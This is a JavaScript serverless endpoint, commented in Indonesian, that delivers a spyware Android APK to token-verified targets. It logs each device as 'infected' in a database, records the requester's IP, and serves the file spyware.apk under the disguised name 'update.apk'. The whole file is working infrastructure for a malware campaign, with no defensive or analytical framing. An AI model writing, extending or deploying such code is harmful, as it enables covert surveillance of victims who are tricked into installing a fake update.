/**
 * FILE: api/payload.js
 * Endpoint GET untuk download payload spyware asli dengan proteksi token.
 */

import { verifyToken } from '../lib/crypto.js';
import { updateTarget } from '../lib/database.js';
import fs from 'fs';
import path from 'path';
import config from '../lib/config.js';

export default async (req, res) => {
  if (req.method !== 'GET') return res.status(405).json({ success: false, error: 'Method Not Allowed' });
  
  try {
    const { token } = req.query;
    if (!token) return res.status(401).json({ success: false, error: 'Token Required' });
    
    const decoded = verifyToken(token);
    if (!decoded) return res.status(401).json({ success: false, error: 'Invalid or Expired Token' });
    
    const deviceHash = decoded.deviceId;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // Log download activity
    await updateTarget(deviceHash, { infected: true, lastSeen: Date.now(), payloadVersion: config.payload.version });
    
    // Tentukan path file APK (misal dari Vercel Blob atau folder public)
    const payloadPath = path.join(process.cwd(), 'public', 'payloads', 'spyware.apk');
    
    if (fs.existsSync(payloadPath)) {
      const file = fs.readFileSync(payloadPath);
      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
      res.setHeader('Content-Disposition', 'attachment; filename=update.apk');
      return res.send(file);
    } else {
      // Jika file tidak ada, mungkin sedang diupdate atau dipindahkan
      return res.status(404).json({ success: false, error: 'Payload not found' });
    }
    
  } catch (err) {
    console.error('Payload Delivery Error:', err.message);
    res.status(500).json({ success: false, error: 'Internal Server Error' });
  }
};
